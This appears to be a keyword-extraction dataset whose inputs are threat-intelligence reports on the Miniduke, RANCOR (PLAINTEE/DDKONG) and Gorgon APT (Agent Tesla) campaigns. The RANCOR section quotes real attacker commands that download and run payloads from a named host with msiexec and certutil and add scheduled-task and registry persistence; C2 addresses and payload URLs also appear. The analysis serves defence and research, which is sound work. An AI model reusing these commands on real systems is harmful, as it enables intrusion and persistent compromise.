+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+.NET+CLR+1.0.3705;+.NET+CLR+1.1.4322;+ .NET4.0E;+.NET4.0C;+.NET+CLR+2.0.50727) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+InfoPath.2)Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/4.0;+GTB7.4;+SLCC2;+.NET +CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+InfoPa th.3;+.NET4.0C;+.NET4.0E) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0 .50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0 .50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+InfoPath.3;+Media+Center+PC+6.0;+.N ET4.0C;+.NET4.0E) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0 .50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET 4.0E) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0 .50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+Info Path.2;+.NET4.0E) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0 .50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+CMDTDF;+.NET4. 0C;+InfoPath.3) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0 .50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+InfoPath.2) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/5.0;+SLCC2;+.NET+ CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0 C;+.NET4.0E) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/5.0;+SLCC2;+.NET+ CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0 C;+.NET4.0E;+BRI/2;+InfoPath.3) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/5.0;+SLCC2;+.NET+ CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0 C;+.NET4.0E;+InfoPath.2) Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/5.0;+SLCC2;+.NET+ CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0 C;+.NET4.0E;+InfoPath.3) Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+Trident/4.0;+.NET+CLR+2.0.50727; +.NET+CLR+3.0.04506.648;+.NET+CLR+3.5.21022;+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.3 0729;+InfoPath.2) Mozilla/5.0+(Windows+NT+5.1;+rv:19.0)+Gecko/20100101+Firefox/19.0 Mozilla/5.0+(Windows+NT+6.1;+rv:10.0)+Gecko/20100101+Firefox/10.Figure 11 – Agent strings used in C&C comms – might be partial or wrong – not useful for detection4.3. Other indicators of C&C communication: Google andTwitter queriesThe Google search step also uses different agent strings:„GET /search/?q=lUFEfiHKDroLaKYr HTTP/1.1"" 304 211 ""-"" ""Opera/7.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US; WOW64)"" „GET /search?q=lUFEfiHKDroLaKYr HTTP/1.1"" 301 588 ""-"" ""Opera/5.0 (Windows; U; Windows NT 5.2; en-US; Trident/4.0)"" „GET /search?q=lUFEfiHKDroLaKYr HTTP/1.1"" 301 588 ""-"" ""Opera/4.0 (Windows NT 5.1; en-GB; Trident/4.0)""Figure 12 – Some Google search agent strings""GET /EdithAlbert11 HTTP/1.1"" 404 1229 ""-"" ""Mozilla/6.0 (X11; Linux x86_64; en-GB; Trident/5.0)"" ""GET /ifsWcj9a HTTP/1.1"" 404 529 ""-"" ""Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; en-GB; WOW64; Trident/5.0)"" ""GET /EdithAlbert11 HTTP/1.1"" 404 644 ""-"" ""Mozilla/5.0 (Windows NT 5.1; en-GB; Trident/4.0)"" ""GET /ifsWcj9a HTTP/1.1"" 404 529 ""-"" ""Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; en; WOW64; Trident/5.0)"" ""GET /EdithAlbert11 HTTP/1.1"" 404 1229 ""-"" ""Mozilla/7.0 (compatible; MSIE 7.0; Windows NT 6.0; en-GB; WOW64)"" ] ""GET /ifsWcj9a HTTP/1.1"" 404 510 ""-"" ""Opera/5.0 (compatible; MSIE 9.0; Windows NT 6.1; en-GB; SV1)""Figure 13 – Twitter search samples – 443/SSLThe C&C server’s response – if it sends encrypted files – is a GIF file containing a small icon,and after that, the malware:0x0020: XXXX XXXX XXXX XXXX 4749 4638 3961 2000 XXXXXXXXGIF89a 0x0030: 2000 f700 00bc 5514 faa9 52eb 851c f39b U R 0x0040: 50ee 934d bd4e 05eb 8422 1a20 32ea b279 P M.N "" 2 y 0x0050: 973f 06e9 7522 fdf9 f5d8 6c40 a148 10f9 .? u"" l@.H 0x0060: e5d4 181d 2df5 9f4a 402c 29ec 8a46 fdf5 - J@,) F 0x0070: ecef caa6 e37d 46dc 5d22 c152 09dc 8d49 }F.]"".R I 0x0080: eccb b4f4 dac3 fa91 21f8 8e22 c15a 19f4 ! "".Z 0x0090: 871b fb9f 3bfb 972e f1cb b3e9 ab6c f289 ; l 0x00a0: 31f9 9837 0d0f 17e9 8446 7333 0bfb e8d3 1 7 Fs3 Figure 14 – GIF File header sent back by the C&C serverFor stage 3 (i.e., <id>.gif files), the file downloaded has a larger size (~300KB). It also beginswith a GIF header, but that header is only 13 bytes long, and then starts the encryptedexecutable, as shown below:Examples for twits containing the URL of the C&C server are shown below:The weather is good today. Sunny! uri!wp07VkkxYt3Mne5uiDkz4Il/Iw48Ge/EWg== Albert, my cousin. He is working hard. uri!wp07VkkxYmfNkwN2nBmx4ch/Iu2c+GJow39HbphL My native town was ruined by tornado. uri!wp07VkkxYt3Md/JOnLhzRL2FJjY8l2ItFigure 15 – Known twitter answers for C&C discoveryThe twitter information is currently not very useful for content based detection, as it isdownloaded through SSL connection, and therefore, IDS rules can only be applied if someSSL proxy is used.An interesting observation is that this user follows 4 partners, most likely for deception. ","{'phrases': ['the attacker', 'en', '13', 'the victim', 'first', 'stage', 'Miniduke', 'C2', 'Twitter', 'the malware', 'second', 'data', 'GIF', 'details'], 'target': 'the attacker; en; 13; the victim; first; stage; Miniduke; C2; Twitter; the malware; second; data; GIF; details.'}"
spear; emails; documents; targets; links; DDKONG; PLAINTEE; downloaders; data; the attackers; 10; persistence; RAT; the malware; espionage.,['1. Spearphishing emails containing document lures are sent to targets. 2. The documents exploit vulnerabilities to drop and execute the PLAINTEE or DDKONG malware. 3. The malware establishes persistence on the system. 4. The malware phones home to the C2 server over TCP or UDP. 5. The C2 sends commands to collect system info and execute additional plugins. 6. The plugins are used to exfiltrate documents from the target system back to the C2. '],"Extract the keywords: Blog Home > Unit 42 > RANCOR: Targeted Attacks in South East Asia Using PLAINTEE and DDKONG Malware FamiliesRANCOR: Targeted Attacks in South East Asia Using PLAINTEE and DDKONG Malware FamiliesGet updates: Unit 42 Sign up to receive the latest news, cyber threat intelligence and research from Unit42Business EmailBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.ProductsServicesResourcesPartnersCompanySecurity for SupportENBy Brittany Ash, Josh Grunzweig and Tom Lancaster June 26, 2018 at 5:00 AM Category: Unit 42 Tags: DDKONG, KHRAT, PLAINTEE, RANCOR 6,359 (4) Throughout 2017 and 2018 Unit 42 has been tracking and observing a series of highly targeted attacks focused in South East Asia, building on our research into the KHRAT Trojan. Based on the evidence, these attacks appear to be conducted by the same set of attackers using previously unknown malware families. In addition, these attacks appear to be highly targeted in their distribution of the malware used, as well as the targets chosen. Based on these factors, Unit 42 believes the attackers behind these attacks are conducting their campaigns for espionage purposes.We believe this group is previously unidentified and therefore have we have dubbed it “RANCOR”. The Rancor group’s attacks use two primary malware families which we describe in depth later in this blog and are naming DDKONG and PLAINTEE. DDKONG is used throughout the campaign and PLAINTEE appears to be new addition to these attackers’ toolkit. Countries Unit 42 has identified as targeted by Rancor withWeb page converted to PDF with the PDFmyURL PDF creation API!reCAPTCHAPlease upgrade to a supported browser to get a reCAPTCHA challenge.Alternatively if you think you are getting this page in error, please check your internet connection and reload.Why is this happening to me? SUBMITthese malware families include, but are not limited to:Singapore CambodiaWe identified decoy files which indicate these attacks began with spear phishing messages but have not observed the actual messages. These decoys contain details from public news articles focused primarily on political news and events. Based on this, we believe the Rancor attackers were targeting political entities. Additionally, these decoy documents are hosted on legitimate websites including a government website belonging to the Cambodia Government and in at least once case, Facebook.The malware and infrastructure used in these attacks falls into two distinct clusters, which we are labeling A and B, that are linked through their use of the PLAINTEE malware and several “softer” linkages.Linking the attacks Building on our previous research into KHRAT Trojan, we have been monitoring KHRAT command and control domains. In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97. We made this IP the center of our investigation.Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies. One of these domains, facebook-apps[.]com, was were able to link all PLAINTEE samples together by the infrastructure they use. The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two.Figure 1 – Diagram showing the split of PLAINTEE samples across the two clusters of activity.Our Investigation into both clusters further showed that they were both involved in attacks targeting organizations in South East Asia. Based on the use of the relatively unique PLAINTEE malware, the malware’s use of the same file paths on in each cluster, and the similar targeting, we have grouped these attacks together under the RANCOR campaign moniker.Web page converted to PDF with the PDFmyURL PDF creation API!Delivery & Loader mechanisms For many of the samples we’ve been unable to identify how they were delivered to end victims; however, in three cases we were able to locate the files used to deliver the Trojan, which we found merited more investigation and are briefly discussed below.Cluster ACase 1: Delivery via document property macro – In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware. Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document.By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’ codes small footprint can help enable evasion of automated detection mechanisms based on macro content.Figure 2 – The entire contents of the macroThe ‘Company’ field in this case, contains the raw command that the attacker wishes to run, downloading and executing the next stage of the malware:Web page converted to PDF with the PDFmyURL PDF creation API!1 12cmd /c set /p=Set v=CreateObject(^""Wscript.Shell^""):v.Run ^""msiexec /q /i C:\Windows\System32\spool\drivers\color\tmp.vbs & schtasks /create /sc MINUTE /tn ""Windows System"" /tr ""C:\Windows\System32\spool\drivers\color\tmp.vbs"" /mo 2 /F & schtasks /create /sc MINUTE /tn ""Windows System"" /tr ""C:\Windows\System32\spool\drivers\color\tmp.vbs"" /mo 2 /RU SYSTEM /c set /p=Set v=CreateObject(^""Wscript.Shell^""):v.Run ^""msiexec /q /i C:\Windows\System32\spool\drivers\color\tmp.vbs & schtasks /create /sc MINUTE /tn ""Windows System"" /tr ""C:\Windows\System32\spool\drivers\color\tmp.vbs"" /mo 2 /F & schtasks /create /sc MINUTE /tn ""Windows System"" /tr ""C:\Windows\System32\spool\drivers\color\tmp.vbs"" /mo 2 /RU SYSTEMCluster B Case 2: Delivery via HTA Loader – In this case the attackers sent an HTML Application file (.hta) to targets most likely as an email attachment. When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3).Figure 3 – The decoy image loaded when the .HTA file is executed.The decoy in Figure 3 strongly suggests the attackers were conducting an attack against a political entity inWeb page converted to PDF with the PDFmyURL PDF creation API!Cambodia. The Cambodia National Rescue Party is a politically motivated opposition movement.Case 3: Delivery via DLL Loader – We identified three unique DLL loaders during this analysis. The loaders are extremely simple with a single exported function and are responsible for executing a single command. An exemplar command is given below:cmd /c Echo CreateObject(""WScript.Shell"").Run ""msiexec /q /i http:\\dlj40s.jdanief[.]xyz/images/word3.doc"",0 >%userProfile%\AppData\Local\Microsoft\microsoft.vbs /c Echo CreateObject(""WScript.Shell"").Run ""msiexec /q /i http:\\dlj40s.jdanief[.]xyz/images/word3.doc"",0 >%userProfile%\AppData\Local\Microsoft\microsoft.vbs schtasks /create /sc MINUTE /tn ""Windows Scheduled MaintenBa"" /tr ""wscript %userProfile%\AppData\Local\Microsoft\microsoft.vbs"" /mo 10 /F /create /sc MINUTE /tn ""Windows Scheduled MaintenBa"" /tr ""wscript %userProfile%\AppData\Local\Microsoft\microsoft.vbs"" /mo 10 /F cmd /c certutil.exe -urlcache -split -f http:\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\ProgramData\1.pdf&start C:\ProgramData\1.pdf /c certutil.exe -urlcache -split -f http:\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\ProgramData\1.pdf&start C:\ProgramData\1.pdf1 17In the above command, the malware is downloading and executing a payload and configuring it for persistent execution. In two of the three examples, the malware also downloads and opens a decoy PDF document hosted on a legitimate but compromised website. The decoy documents seen in these cases were related to Cambodian news articles, an example is shown in Figure 4 below.Web page converted to PDF with the PDFmyURL PDF creation API!Figure 4 – 1.pdf decoy delivered by downloaderThe decoy above discusses a recent event that took place against political party supporters in Cambodia, a similar theme to the decoy document observed in Figure 3.It is worth noting that the third DLL mentioned attempts to download the decoy document from a government website. This same website was used previously in a KHRat campaign targeting Cambodian citizens.Additionally, two of the three DLL loaders were found to be hosted on this same compromised website, implying that it was likely compromised again in early 2018. The filenames for these two DLL loaders are as follows:Activity Schedule.pdf អ(cid:2)កនេ(cid:6)(cid:7)យក(cid:9)(cid:10)ត់េលើក(cid:9)(cid:10)ត (Translated from Khmer: Poli(cid:76)cians betrayed on the betrayal)Web page converted to PDF with the PDFmyURL PDF creation API!Malware Overview In all cases where we were able to identify the final payloads used, the DDKONG or PLAINTEE malware families were used. We observed DDKONG in use between February 2017 and the present, while PLAINTEE is a newer addition with the earliest known sample being observed in October 2017. It’s unclear if DDKONG is only used by one threat actor or more than one based on the data available.In this section we’ll go over the capabilities and operation of these malware families.DDKONG For the analysis below, we used the following file:SHA256 2018-03-14 07:20:11 UTC PE32 executable (DLL) (GUI) Intel 80386, for MS WindowsTable 1 – DDKONG sample analyzed in full.The malware in question is configured with the following three exported functions:ServiceMain Rundll32Call DllEntryPointThe ServiceMain exported function indicates that this DLL is expected to be loaded as a service. If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe.The Rundll32Call exported function begins by creating a named event named ‘RunOnce’. This event ensures that only a single instance of DDKong is executed at a given time. If this is the only instance of DDKongWeb page converted to PDF with the PDFmyURL PDF creation API!running at the time, the malware continues. If it’s not, it dies. This ensures that only a single instance of DDKong is executed at a given time.DDKong attempts to decode an embedded configuration using a single byte XOR key of 0xC3. Once decoded, the configuration contains the data shown in Figure 5 below.Figure 5 – Decoded configuration with fields highlightedAfter this configuration is decoded and parsed, DDKONG proceeds to send a beacon to the configured remote server via a raw TCP connection. The packet has a header of length 32 and an optional payload. In the beacon, no payload is provided, and as such, the length of this packet is set to zero.Web page converted to PDF with the PDFmyURL PDF creation API!Figure 6 – DDKONG beacon to remote C2After it sends the beacon, the malware expects a response command of either 0x4 or 0x6. Both responses instruct the malware to download and load a remote plugin. In the event 0x4 is specified, the malware is instructed to load the exported ‘InitAction’ function. If 0x6 is specified, the malware is instructed to load the exported ‘KernelDllCmdAction’ function. Prior to downloading the plugin, the malware downloads a buffer that is concatenated with the embedded configuration and ultimately provided to the plugin at runtime. An example of this buffer at runtime is below:00000000: 43 3A 5C 55 73 65 72 73 5C 4D 53 5C 44 65 73 6B C:\Users\MS\Desk 00000010: 74 6F 70 5C 52 53 2D 41 54 54 20 56 33 5C 50 6C top\RS-ATT V3\Pl 00000020: 75 67 69 6E 42 69 6E 00 00 00 00 00 00 00 00 00 uginBin……… 00000100: 00 00 00 00 43 3A 5C 55 73 65 72 73 5C 4D 53 5C ….C:\Users\MS\ 00000110: 44 65 73 6B 74 6F 70 5C 52 53 2D 41 54 54 20 56 Desktop\RS-ATT V 00000120: 33 5C 5A 43 6F 6E 66 69 67 00 00 00 00 00 00 00 3\ZConfig…….ZConfig……. [TRUNCATED] 00000200: 00 00 00 00 00 00 00 00 00 40 00 00 F0 97 B5 01 ………@……As we can see in the above text, two full file paths are included in this buffer, providing us with insight into the original malware family’s name, as well as the author. After this buffer is collected, the malware downloads the plugin and loads the appropriate function. During runtime, the following plugin was 2018-03-28 01:54:40 UTC PE32 executable (DLL) (GUI) Intel 80386, for MS WindowsTable 2 – Plugin downloaded during runtime for DDKong sample.DDKong sample.This plugin provides the attacker with the ability to both list files and download/upload files on the victim machine.PLAINTEE In total we have been able to find six samples of PLAINTEE, which, based on our analysis, seems to be exclusively used by the RANCOR attackers. PLAINTEE is unusual in that it uses a custom UDP protocol for its network communications. For this walk through, we use the following sample:SHA256 2018-04-02 07:57:38 UTC PE32 executable (DLL) (GUI) Intel 80386, for MS WindowsTable 3 – PLAINTEE sample analyzed in full.This sample is configured with three exported functions:Add Sub DllEntryPointThe DLL expects the export named ‘Add’ to be used when initially loaded. When this function is executed PLAINTEE executes the following command in a new process to add persistence:Web page converted to PDF with the PDFmyURL PDF creation API!1 6cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\RunOnce"" /v ""Microsoft Audio"" /t REG_SZ /d ""%APPDATA%\Network Service.exe"" ""[path_to_PLAINTEE]"",Add /freg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\RunOnce"" /v ""Microsoft Audio"" /t REG_SZ /d ""%APPDATA%\Network Service.exe"" ""[path_to_PLAINTEE]"",Add /fNext, the malware calls the ‘Sub’ function which begins by spawning a mutex named ‘microsoftfuckedupb’ to ensure only a single instance is running at a given time. In addition, PLAINTEE will create a unique GUID via a call to CoCreateGuid() to be used as an identifier for the victim. The malware then proceeds to collect general system enumeration data about the infected machine and enters a loop where it will decode an embedded config blob and send an initial beacon to the C2 server.The configuration blob is encoded using a simple single-byte XOR scheme. The first byte of the string is used as the XOR key to in turn decode the remainder of the data.Decoding this blob yields the following information, also found within the original binary:Offset C2 port (0x1f99 – 8089) C2 host (45.76.176[.]236) Flag used to identify the malware in network communications. (default flag:4/2/2018 1:01:33 AM)Table 4 – Configuration stored in the malware.The malware then proceeds to beacon to the configured port via a custom UDP protocol. The network traffic is encoded in a similar fashion, with a random byte being selected as the first byte, which is then used to decode the remainder of the packet via XOR. An example of the decoded beacon is show in Figure 7.Web page converted to PDF with the PDFmyURL PDF creation API!Figure 7 PLAINTEE example beaconThe structure for this beacon is given in Table 5.Offset Victim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3) Command (0x66660001) Length of payload (0x2f – 47) Field 1 – Windows major version (0x6 – Windows Vista+) Field 2 – Windows minor version (0x1 – Windows 7) Field 3 – Unknown (0x20) Payload (default flag:4/2/2018 1:01:33 AM)Table 5 – Beacon structure for PLAINTEE.This beacon is continuously sent out until a valid response is obtained from the C2 server (there is no sleep timer set). After the initial beacon, there is a two second delay in between all other requests made. This response is expected to have a return command of 0x66660002 and to contain the same GUID that was sent to the C2 server. Once this response is received, the malware spawns several new threads, with different Command parameters, with the overall objective of loading and executing a new plugin that is to be received from the C2 server.Web page converted to PDF with the PDFmyURL PDF creation API!During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin Compile Time 2017-09-25 00:54:18 UTC File TypePE32 executable (DLL) (GUI) Intel 80386, for MS WindowsTable 6 – PLAINTEE plugin observed in WildfirePLAINTEE expects the downloaded plugin to be a DLL with an export function of either ‘shell’ or ‘file’. The plugin uses the same network protocol as PLAINTEE and so we were able to trivially decode further commands that were sent. The following commands were observed:tasklist ipconfig /allThe attacker performed these two commands 33 seconds apart. As automated commands are typically performed more quickly this indicates that they may have been sent manually by the attacker.Conclusions The RANCOR campaign represents a continued trend of targeted attacks against entities within the South East Asia region. In a number of instances, politically motivated lures were used to entice victims into opening and subsequently loading previously undocumented malware families. These families made use of custom network communication to load and execute various plugins hosted by the attackers. Notably the PLAINTEE malwares’ use of a custom UDP protocol is rare and worth considering when building heuristics detections for unknown malware. Palo Alto Networks will continue to monitor these actors, their malware, and their infrastructure going forward.Palo Alto Networks customers are protected against the threats discussed in this blog in the following ways:Wildfire correctly identifies all samples discussed as malicious. Traps appropriately blocks the malware from executing. Web page converted to PDF with the PDFmyURL PDF creation API!AutoFocus customers may track this threat via the KHRAT, DDKONG, PLAINTEE, and RANCOR tags.Additional mitigations that could help to prevent attacks like these from succeeding in your environment include:Changing the default handler for “.hta” files in your environment so that they cannot be directly executed.hta” files in your environment so that they cannot be directly executed.Appendix A – PLAINTEE older variant Older variants of PLAINTEE can be identified via the unique mutex created during runtime. At least three variants of PLAINTEE have been identified to date, however, the following two samples have additional function helloworld1 – accepts command-line arguments, performs a UAC bypass helloworld2 – drops and compiles a mof filemof file sqmAddTostream – expected to run initially by the malware, checks OS version and loads the malware with helloworld2 – expected to run initially by the malware, checks OS version and loads the malware with helloworld2Appendix BWeb page converted to PDF with the PDFmyURL PDF creation API!ValueType Domain www.facebook-apps.com Domain dlj40s.jdanief.xyz Domain goole.authorizeddns.us Domain www.google_ssl.onmypc.org Domain ftp.chinhphu.ddns.ms Hash Domain www.microsoft.https443.org Domain msdns.otzo.com Hash Domain goole.authorizeddns.us IPA ","{'phrases': ['spear', 'targets', 'the document', 'documents', 'B', 'PLAINTEE', 'DDKONG Malware', 'the malware', 'persistence', 'SYSTEM', 'the C2 server', 'TCP', 'UDP', 'commands', 'addition', 'the plugin', 'Use'], 'target': 'spear; targets; the document; documents; B; PLAINTEE; DDKONG Malware; the malware; persistence; SYSTEM; the C2 server; TCP; UDP; commands; addition; the plugin; Use.'}"
the attack; RTF; CVE-2017-11882; CVE-2017-11882; arbitrary code; ServerCrypted.vbs script; the victim machine; Equation Editor; The OLE object; the victim machine; Excel; the VBScript; EXE; the cscript.exe process; script; the shellcode; the malware; persistence; the command; a VBScript code; memory; the C2 server; AV- vendors; names; function names; tools.,['1. Gorgon APT sends phishing emails with COVID-19 themed Word documents to targets in the MSME sector. 2. The documents contain an exploit for CVE-2017-11882 to execute malicious code. 3. The code drops a visual basic script named ServerCrypted.vbs. 4. The VBScript executes a PowerShell command to download additional payloads. 5. The first payload is an injector DLL. 6. The second payload is the Agent Tesla remote access Trojan (RAT). 7. The injector DLL loads itself into memory using PowerShell. 8. Agent Tesla is injected into the RegAsm.exe process. 9. Agent Tesla steals sensitive data and screenshots from the compromised system. 10. The data is exfiltrated via SMTP by Agent Tesla to Gorgon APT operators. '],"Extract the keywords: 8/12/2020Gorgon APT targeting MSME sector in IndiaGorgon APT targeting MSME sector in Indiaseqrite.com/blog/gorgon-apt-targeting-msme-sector-in-indiaBy Pavankumar ChaudhariAugust 10, 2020APT, Cybersecurity, UncategorizedEstimated reading time: 5 minutes From the past few months, we have been monitoring cyber-threats on MSME [Micro, Small and Medium Enterprises] sector within India. MSME sector is considered to be the backbone of the Indian economy. MSME employs around 40% of the country’s workforce, contributing nearly 45% to manufacturing output and 40% of exports. Staring at a major financial resource crunch, MSME’s are worst affected due to the ongoing COVID-19 pandemic.We observed one similar wave on MSME in late April 2020 — it was a phishing campaign luring victims with COVID-19 themed maldocs. From this campaign, one prominent file was:FileName face mask order.docMD54FC5BA9426E9191AAB4E694E7E703E13SHA-1B5EBAF2F5AF220FE1B1DE5433C2E39FF16B0C0B4SHA-2562022D9CC42ED2838DAA442561107C29297BD- DB88B36222345C10B39164E66819Preva- lence300+url APT targeting MSME sector in IndiaFigure 1: Trend for Gorgon APT sampleTechnical DetailsVictims received an email with attached zip “face mask order.zip” which contained the aforementioned maldoc responsible to drop malware into the victim machine. The attack begins after opening “face mask order.doc”. This RTF is weaponized with exploit which triggers CVE-2017-11882 vulnerability to execute arbitrary code.Figure 2: Process Infection ChainCVE-2017-11882 Analysis:Malicious rtf document contains two malicious ole objects.url APT targeting MSME sector in IndiaFigure 3: RTF ObjectsThe tools extracts the ole objects from RTF file. OLE object (#0) is a VBScript file (i.e. ServerCrypted.vbs script) and object (#2) contains Equation Editor Exploit and command to execute file “CmD.exe /C cscript %tmp%\ServerCrypted.vbs”.The OLE object (#0) is an executable file (i.e. ServerCrypted.vbs script) as shown in figure 4.url APT targeting MSME sector in IndiaFigure 4: Embedded VBScriptThe class name for this object (#2) is Equation.3 the exploit (CVE-2017-11882) as shown in the below image.Figure 5: RTF contentsurl APT targeting MSME sector in IndiaIt also contains the command to run ServerCrypted.vbs script as shown in below figure 6.Figure 6: RTF contentsCVE-2017-11882 is present in the Microsoft Office Equation Editor (EQNEDT32.EXE) component. The attacker can successfully exploit a stack buffer overflow vulnerability in the equation editor component of MS Office and execute arbitrary code. The root cause of this vulnerability is copy unbounded string of FONT name defined within a FONT record structure of Equation Editor OLE object data.The below figure shows the stack buffer overflow scenario while copying the font name into a locally created buffer.url APT targeting MSME sector in IndiaFigure 7: Stack buffer overflow scenarioIn this case, the function will return “back” to 0x430c12, which is the address of WinExec, and the argument is the “font name” and command which the attacker wants to execute.Figure 8: Return address, overwritten with WinExecVBScript Analysis:url APT targeting MSME sector in IndiaAfter successful exploitation, cmd.exe is executed with commands:“/c cscript %tmp%\ServerCrypted.vbs >> AC”This command creates a cscript.exe process to execute code in ServerCrypted.vbs. VBScript file was already dropped in %temp% folder by WinWord process. Below Figure shows the VBScript code. As shown in figure 9 and figure 10, actors used some AV- vendors names in function names, variable names, and strings. This VBScript is responsible to execute two processes, cmd.exe and powershell.exe. Figure 10 shows the obfuscated PowerShell script.Figure 9: Contents of ServerCrypted.vbsurl APT targeting MSME sector in IndiaFigure 10: Contents of ServerCrypted.vbsPowerShell Analysis:Figure 11 shows the de-obfuscated PowerShell script.As shown below, the script downloads two files with a .jpg extension. First file “15882060891.jpg” is a PowerShell script which contains encoded injector DLL written in C#, as shown in figure 12. This DLL is loaded in-memory by PowerShell. In this script, actors used some interesting names of class and function of injector DLL like FlorianRoth and Cyb3rOps. Florian Roth is a well-known security researcher and CTO of Nextron Systems. Cyb3rOps is his twitter handle name. The second file which is downloaded by PowerShell is “15882060892.jpg”, is an encoded agent tesla payload. This payload is injected in Windows native binary RegAsm.exe.Figure 11: Decoded PowerShell scriptBelow is encoded data of hxxp://www[.]m9c[.]net/uploads/15882060891.jpg. This is a PowerShell code and encoded injector DLL data.url APT targeting MSME sector in IndiaFigure 12: Contents of 15882060891.jpgAfter decoding PE header of injector DLL can be seen.Figure 13: Decoded data of 15882060891.jpgBelow figure shows contents of hxxp://www[.]m9c[.]net/uploads/15882060892.jpg. It is the encoded data of the final payload.url APT targeting MSME sector in IndiaFigure 14: Contents of 15882060892.jpgFinal Payload – Agent Tesla:Below figure shows injected Agent Tesla payload in RegAsm.exe.Figure 15: Injected payloadAgent Tesla is a well-known keylogger and infostealer written in DotNet. This malware steals information from a variety of applications like Web Browsers, Email Clients, FTP Clients, Messenger applications, VPN clients, etc. and can also take screenshots of the system. All stolen data is exfiltrated over SMTP.url APT targeting MSME sector in IndiaWe have already explored and analysed Agent Tesla in our last couple of blogs:url sectors-in-india/url TTPs shared above, have been seen on several occasions in the last few years. Looking at malware, C2 and technique execution, Quick Heal correlates this campaign on MSME sector to Gorgon group [a.k.a. Subaat]. All members of the Gorgon cyber-criminal group purport to have Pakistan-based interests/connections. Recently, another Gorgon campaign was uncovered a few months back which used the same commodity malware RATs to accomplish their objective.Given the global impact of COVID-19, threat actors will likely continue to use COVID-19- themed emails to deliver malware broadly in support of their objectives. Considering this trend, we encourage Micro, Small and Medium Enterprises to apply extra scrutiny to COVID-19-related emails containing attachments. Though large organizations, critical government infrastructures, and others have somewhat built resilience to such cyber threats; but MSME still needs to cover-up and remain extra vigilant with a robust strategy to mitigate risks.Threat ProtectionOur Seqrite and Quick Heal line of products protect against top cyber threats including Microsoft Office Memory Corruption Vulnerability (CVE-2017-11882) and variants of Agent Tesla RAT. Our advanced signature-less behaviour-based detection successfully blocks Agent Tesla variants.Quick Heal advises users to exercise ample caution and avoid opening attachments & clicking on web links in unsolicited emails. Users should also keep their Operating System updated and have a full-fledged security solution installed on all devices.While organizations with appropriate spam filtering, proper system administration, and up-to-date Windows hosts have a much lower risk of infection, we further encourage organizations to validate the installation of the Microsoft patch for CVE 2017-11882.Quick Heal’s research team is proactively monitoring all campaigns targeting MSME’s and working relentlessly to ensure the safety of our customersSubject matter experts:Kalpesh Mantri Bajrang Mane Pavankumar Chaudhariurl APT targeting MSME sector in Indiaurl ","{'phrases': ['Gorgon APT', 'emails', 'COVID-19', 'MSME sector', 'Exploit', 'CVE-2017-11882', 'code', 'ServerCrypted.vbs', 'The VBScript', 'PowerShell', 'command', 'first', 'injector DLL', 'second', 'Agent Tesla', 'memory', 